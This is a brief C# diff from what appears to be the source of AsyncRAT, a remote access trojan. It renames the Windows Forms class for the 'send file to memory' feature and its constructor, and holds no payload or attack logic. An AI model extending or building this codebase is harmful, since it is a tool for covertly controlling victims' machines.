@@ -12,9 +12,9 @@ using System.Reflection;
 
 namespace AsyncRAT_Sharp
 {
-    public partial class SendFileToMemory : Form
+    public partial class FormSendFileToMemory : Form
     {
-        public SendFileToMemory()
+        public FormSendFileToMemory()
         {
             InitializeComponent();
         }
